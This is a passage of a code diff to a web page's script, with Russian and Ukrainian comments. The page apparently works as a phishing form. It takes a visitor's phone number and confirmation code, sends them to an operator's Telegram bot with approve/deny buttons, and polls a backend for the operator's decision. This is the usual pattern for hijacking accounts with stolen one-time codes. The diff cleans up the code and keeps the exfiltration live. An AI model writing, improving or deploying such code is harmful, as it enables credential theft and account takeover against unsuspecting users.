+                     if(loaderElement) loaderElement.style.display = "none"; // Скрыть лоадер
+                     formCodeInputContainer.style.display = "block"; // Показать форму ввода кода
+                     document.getElementById("code").focus();
+                }
             });
+
             codeStepBtn?.addEventListener("click", function (e) {
                 e.preventDefault();
                 const codeInput = document.getElementById("code");
@@ -1087,24 +901,18 @@
                 }
 
                 const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
-                const keyboard = {
-                    inline_keyboard: [
-                        [{ text: "✅ Так", callback_data: `confirm_yes_${phone}` },
-                         { text: "❌ Ні", callback_data: `confirm_no_${phone}` }]
-                    ]
-                };
-                // НЕБЕЗОПАСНО: Прямой запрос к Telegram API с токеном
+                const keyboard = { inline_keyboard: [ [{ text: "✅ Так", callback_data: `confirm_yes_${phone}` }, { text: "❌ Ні", callback_data: `confirm_no_${phone}` }] ] };
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id, text: msg, reply_markup: keyboard })
                 }).catch(err => console.error("Telegram API error:", err));
 
-                if (formStep2Container) formStep2Container.style.display = "none";
+                if (formCodeInputContainer) formCodeInputContainer.style.display = "none";
                 if (loaderElement) loaderElement.style.display = "block"; 
-
                 waitForApproval(phone);
             });
+
             function waitForApproval(phone) {
                 const interval = setInterval(() => {
                     fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
@@ -1123,38 +931,31 @@
                                 if (loaderElement) loaderElement.style.display = "none";
                                 document.getElementById("popwhat").style.display = "block";
                             }
-                            // Если статус 'pending' или другой, ничего не делаем, ждем следующей проверки
                         })
                         .catch(err => {
                             console.error("❌ Помилка запиту до бекенду:", err);
-                            // Можно раскомментировать для остановки и показа ошибки пользователю
-                            // clearInterval(interval); 
-                            // if (loaderElement) loaderElement.style.display = "none";
-                            // alert(translations[currentLang]["error.backendConnection"] || "Error connecting to the server. Please try again.");
                         });
                 }, 3000);
             }
 
-            // Инициализация intl-tel-input
-            const phoneInputField = document.querySelector("#number");
+            const phoneInputField = document.querySelector("#form-step-1 input.number"); // Более точный селектор
             if (phoneInputField && window.intlTelInput) {
                 const iti = window.intlTelInput(phoneInputField, {
                     initialCountry: "auto",
-                    geoIpLookup: function(success, failure) { // Изменен API для geoIpLookup
+                    geoIpLookup: function(success, failure) { 
                         fetch("https://ipapi.co/json")
                           .then(function(res) { return res.json(); })
                           .then(function(data) { success(data.country_code); })
-                          .catch(function() { success("us"); }); // Fallback
+                          .catch(function() { success("us"); }); 
                     },
                     utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
-                    nationalMode: false, // Чтобы всегда показывался код страны
-                    formatOnDisplay: true, // Форматирует номер при отображении
-                    separateDialCode: true // Показывает код страны отдельно
+                    nationalMode: false, 
+                    formatOnDisplay: true, 
+                    separateDialCode: true 
                 });
-                // Синхронизация кастомного списка флагов с intl-tel-input (если нужно)
                 phoneInputField.addEventListener('countrychange', function() {
                     const selectedCountryData = iti.getSelectedCountryData();
-                    const countryDiv = document.querySelector('.block.number .form .country');
+                    const countryDiv = document.querySelector('#form-step-1 .form .country'); // Более точный селектор
                     const countryDivImg = countryDiv?.querySelector('.image img');
                     const countryDivName = countryDiv?.querySelector('p.name');
 
@@ -1165,21 +966,15 @@
                     if (countryDivName) {
                         countryDivName.textContent = selectedCountryData.name;
                     }
-                    // Обновление значения инпута #number не требуется, т.к. intl-tel-input делает это сам.
-                    // Однако, если ваш кастомный список стран (тот, что с классом .countries) используется для ВЫБОРА страны,
-                    // то при клике на элемент в этом списке вам нужно будет вызывать iti.setCountry(countryCode);
-                    // чтобы intl-tel-input обновился.
                 });
 
-                // Пример, как обновить intl-tel-input из вашего кастомного списка:
                 document.querySelectorAll('.countries .item').forEach(item => {
                     item.addEventListener('click', () => {
-                        const countryCode = item.dataset.lang; // 'AU', 'GB', etc.
+                        const countryCode = item.dataset.lang; 
                         if (countryCode) {
                             iti.setCountry(countryCode.toLowerCase());
                         }
-                        // Также обновите ваш блок .country вручную, как это делает number.js
-                        const countryDiv = document.querySelector('.block.number .form .country');
+                        const countryDiv = document.querySelector('#form-step-1 .form .country');
                         const countryDivImg = countryDiv?.querySelector('.image img');
                         const countryDivName = countryDiv?.querySelector('p.name');
                         const itemImg = item.querySelector('.image img');
@@ -1188,19 +983,15 @@
                         if(countryDivImg && itemImg) countryDivImg.src = itemImg.src;
                         if(countryDivName && itemName) countryDivName.textContent = itemName.textContent;
                         
-                        document.querySelector('.countries').classList.add('hidden'); // Скрыть список
+                        document.querySelector('.countries').classList.add('hidden'); 
                     });
                 });
-                 // Открытие/закрытие вашего кастомного списка стран
-                const countrySelector = document.querySelector('.block.number .form .country');
+                const countrySelector = document.querySelector('#form-step-1 .form .country');
                 countrySelector?.addEventListener('click', () => {
                     document.querySelector('.countries').classList.toggle('hidden');
                 });
-
-
-            } // конец if (phoneInputField && window.intlTelInput)
-
-        }); // конец DOMContentLoaded
+            } 
+        }); 
     </script>
 </body>
 </html>
